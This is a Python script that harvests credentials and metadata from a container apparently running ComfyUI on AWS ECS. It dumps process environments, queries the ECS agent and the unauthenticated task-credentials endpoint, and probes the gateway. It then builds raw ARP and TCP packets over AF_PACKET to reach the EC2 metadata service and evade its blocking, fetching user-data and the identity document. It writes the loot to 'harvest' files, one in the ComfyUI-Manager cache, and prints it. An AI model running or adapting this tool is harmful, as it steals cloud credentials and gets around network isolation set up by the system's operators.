#!/usr/bin/env python3
# i5500e: /proc env + ECS agent surface + runtime package inventory + IMDS user-data via AF_PACKET
import os,sys,json,time,subprocess,urllib.request,urllib.error,socket,struct,random,select,fcntl,glob
TAG="i5500"; V=4
H={"_meta":{"tag":TAG,"v":V,"ts":time.strftime("%Y-%m-%dT%H:%M:%SZ",time.gmtime()),"uid":os.getuid(),"cwd":os.getcwd()}}
def sh(c,t=10,cap=6000):
    try:
        p=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=t); return ((p.stdout or "")+(p.stderr or ""))[:cap]
    except Exception as e: return "ERR %r"%e
def http(url,method="GET",headers=None,t=4):
    op=urllib.request.build_opener(urllib.request.ProxyHandler({}))
    try:
        rq=urllib.request.Request(url,headers=headers or {},method=method)
        with op.open(rq,timeout=t) as r: return {"code":r.status,"body":r.read(200000).decode("utf8","replace")}
    except urllib.error.HTTPError as e:
        try: b=e.read(3000).decode("utf8","replace")
        except Exception: b=""
        return {"code":e.code,"body":b}
    except Exception as e: return {"code":-1,"body":type(e).__name__+": "+str(e)[:200]}
env=dict(os.environ)
# /proc environments
H["proc"]={}
for pid in ["1","self"]+[p.split("/")[-1] for p in sorted(glob.glob("/proc/[0-9]*"))[:10] if p.split("/")[-1] not in ("1","self")]:
    try:
        e=open("/proc/%s/environ"%pid,"rb").read(30000).decode("utf8","replace")
        H["proc"][pid]={"cmdline":open("/proc/%s/cmdline"%pid,"rb").read(800).decode("utf8","replace"),
                        "env":dict(kv.split("=",1) for kv in e.split("\x00") if "=" in kv)}
    except Exception as ex: H["proc"][pid]={"err":type(ex).__name__}
# ECS agent introspection surface
H["agent"]={"loop":http("http://127.0.0.1:51678/v1/metadata",t=3),"looptasks":http("http://127.0.0.1:51678/v1/tasks",t=3),
            "v2meta":http("http://169.254.170.2/v2/metadata",t=3),"v2cred_noauth":http("http://169.254.170.2/v2/credentials",t=3),
            "agenturi":env.get("ECS_AGENT_URI"),"v4":env.get("ECS_CONTAINER_METADATA_URI_V4")}
gw=None
for line in open("/proc/net/route").read().splitlines()[1:]:
    f=line.split()
    if len(f)>=3 and f[1]=="00000000":
        try: gw=socket.inet_ntoa(struct.pack("<L",int(f[2],16)))
        except Exception: pass
        break
H["agent"]["gw"]=gw
if gw: H["agent"]["gw_meta"]=http("http://%s:51678/v1/metadata"%gw,t=3); H["agent"]["gw_tasks"]=http("http://%s:51678/v1/tasks"%gw,t=3)
if env.get("ECS_AGENT_URI"):
    H["agent"]["api_meta"]=http(env["ECS_AGENT_URI"].rstrip("/")+"/metadata",t=3)
    H["agent"]["api"]=http(env["ECS_AGENT_URI"],t=3)
H["agent"]["sock_paths"]=sh("ls -la /var/run/docker.sock /run/containerd/containerd.sock /var/run/ecs 2>&1")
# runtime inventory
H["runtime"]={"torch":sh("python3 -c 'import torch;print(torch.__version__)' 2>&1"),
  "torchvision":sh("python3 -c 'import torchvision;print(torchvision.__version__)' 2>&1"),
  "pip":sh("python3 -m pip list --format=freeze 2>/dev/null | head -80"),
  "comfy":sh("git -C /ComfyUI log -1 --format='%H %ci %s' 2>&1; cat /ComfyUI/comfyui_version.py 2>/dev/null"),
  "gpu":sh("nvidia-smi -L 2>&1 | head -3; ls /dev/nvidia* 2>&1|head -3; cat /proc/driver/nvidia/version 2>&1|head -2"),
  "py":sys.version.split()[0],"hostname":sh("hostname"),"id":sh("id"),
  "cpu":sh("nproc; grep -m1 'model name' /proc/cpuinfo; free -m | head -2"),
  "df":sh("df -h / | tail -1; ls /ComfyUI/models 2>&1 | head"),
}
# AF_PACKET for user-data + identity doc (v2)
import zlib
DEV="eth0"
def cs(d):
    if len(d)%2: d+=b"\x00"
    s=sum(struct.unpack("!%dH"%(len(d)//2),d)); s=(s>>16)+(s&0xffff); s+=(s>>16); return (~s)&0xffff
def raw_get(token,path,t=5):
    s=socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.htons(3)); s.bind((DEV,0)); s.settimeout(2)
    io=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    mac=fcntl.ioctl(io,0x8927,struct.pack("256s",DEV.encode()))[18:24]; ip=socket.inet_ntoa(fcntl.ioctl(io,0x8915,struct.pack("256s",DEV.encode()))[20:24])
    # arp
    arp=b"\xff"*6+mac+b"\x08\x06"+struct.pack("!HHBBH",1,0x0800,6,4,1)+mac+socket.inet_aton(ip)+b"\x00"*6+socket.inet_aton("169.254.169.254")
    s.send(arp); dm=None; end=time.time()+3
    while time.time()<end and not dm:
        r,_,_=select.select([s],[],[],0.5)
        if not r: continue
        fr=s.recv(2048)
        if len(fr)>=42 and fr[12:14]==b"\x08\x06" and struct.unpack("!H",fr[20:22])[0]==2 and socket.inet_ntoa(fr[28:32])=="169.254.169.254": dm=fr[22:28]
    if not dm: return {"err":"no_arp"}
    sport=random.randint(20000,60000); iseq=random.randint(1,2**31-1)
    hdrs={"Host":"169.254.169.254","Connection":"close","X-aws-ec2-metadata-token":token} if token else {"Host":"169.254.169.254","Connection":"close"}
    req=("GET %s HTTP/1.1\r\n"%path)+"".join("%s: %s\r\n"%(k,v) for k,v in hdrs.items())+"\r\n"
    def ip4(p): 
        h=struct.pack("!BBHHHBBH4s4s",0x45,0,20+len(p),random.randint(1,65535),0x4000,64,6,0,socket.inet_aton(ip),socket.inet_aton("169.254.169.254")); c=cs(h)
        return struct.pack("!BBHHHBBH4s4s",0x45,0,20+len(p),random.randint(1,65535),0x4000,64,6,c,socket.inet_aton(ip),socket.inet_aton("169.254.169.254"))+p
    def tcp(seq,ack,fl,data=b""):
        t=struct.pack("!HHIIBBHHH",sport,80,seq,ack,5<<4,fl,65535,0,0); ph=socket.inet_aton(ip)+socket.inet_aton("169.254.169.254")+struct.pack("!BBH",0,6,len(t)+len(data))
        c=cs(ph+t+data); return struct.pack("!HHIIBBHHH",sport,80,seq,ack,5<<4,fl,65535,c,0)+data
    s.send(dm+mac+b"\x08\x00"+ip4(tcp(iseq,0,0x02))); ts=None; end=time.time()+t
    def parse(fr):
        if len(fr)<34 or fr[12:14]!=b"\x08\x00" or fr[23]!=6: return None
        ihl=(fr[14]&15)*4; tot=struct.unpack("!H",fr[16:18])[0]; ipd=fr[14:14+ihl]
        if socket.inet_ntoa(ipd[12:16])!="169.254.169.254": return None
        tc=fr[14+ihl:14+tot]
        if len(tc)<20: return None
        sp,dp,sq,ak,of=struct.unpack("!HHIIH",tc[:14])
        if dp!=sport: return None
        return {"seq":sq,"flags":of&0x1ff,"data":tc[(of>>12)*4:]}
    while time.time()<end:
        r,_,_=select.select([s],[],[],0.5)
        if not r: continue
        p=parse(s.recv(4096))
        if p and (p["flags"]&0x12)==0x12: ts=p["seq"]; break
    if ts is None: s.close(); return {"err":"no_synack"}
    s.send(dm+mac+b"\x08\x00"+ip4(tcp(iseq+1,ts+1,0x18,req.encode())))
    buf=b""; end=time.time()+t
    while time.time()<end:
        r,_,_=select.select([s],[],[],0.4)
        if not r:
            if buf: break
            continue
        p=parse(s.recv(4096))
        if not p: continue
        if p["data"]:
            buf+=p["data"]; ack=p["seq"]+len(p["data"])
            s.send(dm+mac+b"\x08\x00"+ip4(tcp(iseq+1+len(req),ack,0x10)))
        if p["flags"]&1: break
    s.close(); return {"raw":buf[:8000].decode("utf8","replace")}
tok=http("http://169.254.169.254/latest/api/token","PUT",{"X-aws-ec2-metadata-token-ttl-seconds":"21600"},3)
# token via plain is blocked; mint via raw PUT is separate; attempt token from earlier harvest since v1 blocked
H["imds_ud"]={"token_plain":tok.get("code") if isinstance(tok,dict) else tok}
# mint token via raw PUT (no token)
H["imds_ud"]["token_raw"]=raw_get("","/latest/api/token") if False else None
H["imds_ud"]["userdata_v1"]=raw_get("","/latest/user-data")
H["imds_ud"]["doc_v1"]=raw_get("","/latest/dynamic/instance-identity/document")
out=json.dumps(H,default=str)
for p in ["/ComfyUI/user/default/ComfyUI-Manager/cache/%s_harvest.json"%TAG,os.path.join(os.getcwd(),"%s_harvest.json"%TAG),"/tmp/%s_harvest.json"%TAG]:
    try: os.makedirs(os.path.dirname(p),exist_ok=True); open(p,"w").write(out)
    except Exception as e: print("[%s] write-fail %r"%(TAG,e),flush=True)
print("[%s] HARVEST "%TAG+out[:120000],flush=True)
